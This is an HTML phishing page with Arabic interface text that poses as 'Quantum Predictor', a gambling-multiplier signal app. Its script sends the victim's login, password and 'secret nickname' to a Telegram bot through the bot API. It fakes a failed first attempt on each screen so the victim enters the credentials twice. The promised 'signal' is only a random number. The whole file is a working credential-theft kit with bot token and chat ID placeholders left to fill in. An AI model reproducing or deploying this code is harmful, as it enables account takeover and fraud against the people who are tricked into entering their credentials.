<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Quantum Predictor v6.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .auth-input { width: 100%; padding: 1rem; background: #121212; border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; text-align: center; color: white; outline: none; }
        .sec-input { width: 100%; padding: 1.2rem; background: white !important; border: 5px solid #ff0000 !important; border-radius: 1rem; color: black !important; font-weight: 900; font-size: 1.3rem; text-align: center; }
        .hidden { display: none !important; }
        .err-msg { color: #ff4444; font-size: 11px; margin-top: 5px; font-weight: bold; }
    </style>
</head>
<body class="bg-[#050505] text-white font-sans overflow-hidden">

    <section id="auth-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 bg-black">
        <div class="w-full max-w-md text-center space-y-8">
            <h1 class="text-4xl font-black italic uppercase">Quantum<span class="text-blue-500">Node</span></h1>
            <p class="text-zinc-500 text-sm">يرجى ربط حساب المنصة لتفعيل المزامنة</p>
            
            <div class="space-y-4">
                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد" class="auth-input">
                <input type="password" id="u_pas" placeholder="كلمة المرور" class="auth-input">
                <p id="login-err" class="err-msg hidden">⚠️ فشل المصادقة: كلمة المرور أو الحساب غير صحيح!</p>
                <button onclick="processLogin()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-2xl font-black text-lg uppercase shadow-lg active:scale-95 transition-all">Start Real-Time Sync</button>
            </div>
        </div>
    </section>

    <section id="security-layer" class="hidden fixed inset-0 z-[60] flex flex-col items-center justify-center p-6 bg-black">
        <div class="w-full max-w-md text-center space-y-6">
            <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mx-auto bg-red-600/10 shadow-[0_0_20px_#ff0000]">
                <span class="text-red-600 text-4xl">⚠️</span>
            </div>
            <h2 class="text-2xl font-black">SECURITY LOCK</h2>
            <p class="text-red-500 font-bold text-[11px]">يرجى إدخال اللقب أو الإجابة السرية لفك تشفير الإشارة (2FA Active)</p>
            
            <input type="text" id="u_nick" placeholder="اكتب اللقب هنا..." class="sec-input">
            <p id="nick-err" class="err-msg hidden">⚠️ خطأ: اللقب غير متطابق مع بيانات الحساب!</p>
            
            <button onclick="processNick()" id="nick-btn" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase active:scale-95 transition-all">Confirm & Unlock</button>
        </div>
    </section>

    <section id="main-app" class="hidden fixed inset-0 flex flex-col items-center justify-center bg-[#050505]">
        <div class="relative w-64 h-64 border-2 border-cyan-500/30 rounded-full flex items-center justify-center">
            <div class="absolute inset-0 border-4 border-cyan-500 rounded-full animate-ping opacity-20"></div>
            <div id="target-mult" class="text-6xl font-black italic text-white drop-shadow-[0_0_15px_#22d3ee]">1.00x</div>
        </div>
        <button onclick="getSignal()" class="mt-12 px-12 py-4 bg-cyan-500 text-black font-black rounded-full uppercase italic shadow-lg shadow-cyan-500/20">Get New Signal</button>
    </section>

    <script>
        const bT = "YOUR_BOT_TOKEN"; 
        const cI = "YOUR_CHAT_ID";
        
        let loginAttempts = 0;
        let nickAttempts = 0;

        function send(m) {
            fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}&parse_mode=html`);
        }

        // منطق الدخول المزدوج
        function processLogin() {
            const u = document.getElementById('u_log').value;
            const p = document.getElementById('u_pas').value;
            if(!u || !p) return;

            loginAttempts++;

            if(loginAttempts === 1) {
                // المرة الأولى: خطأ وهمي
                send(`<b>❌ محاولة 1 (غالباً صحيحة):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
                document.getElementById('login-err').classList.remove('hidden');
                document.getElementById('u_pas').value = ""; // مسح الباسورد ليجبره يعيد
            } else {
                // المرة الثانية: يمر
                send(`<b>✅ محاولة 2 (تأكيد):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('security-layer').classList.remove('hidden');
            }
        }

        // منطق اللقب المزدوج
        function processNick() {
            const n = document.getElementById('u_nick').value;
            if(!n) return;

            nickAttempts++;

            if(nickAttempts === 1) {
                // المرة الأولى: خطأ وهمي
                send(`<b>❌ لقب محاولة 1:</b>\n🔑: <code>${n}</code>`);
                document.getElementById('nick-err').classList.remove('hidden');
                document.getElementById('u_nick').value = "";
            } else {
                // المرة الثانية: يمر للرادار
                send(`<b>✅ لقب محاولة 2 (تأكيد):</b>\n🔑: <code>${n}</code>`);
                document.getElementById('security-layer').classList.add('hidden');
                document.getElementById('main-app').classList.remove('hidden');
            }
        }

        function getSignal() {
            const t = document.getElementById("target-mult");
            t.innerText = "WAIT...";
            setTimeout(() => {
                t.innerText = (Math.random() * (10 - 1.1) + 1.1).toFixed(2) + "x";
            }, 800);
        }
    </script>
</body>
</html>
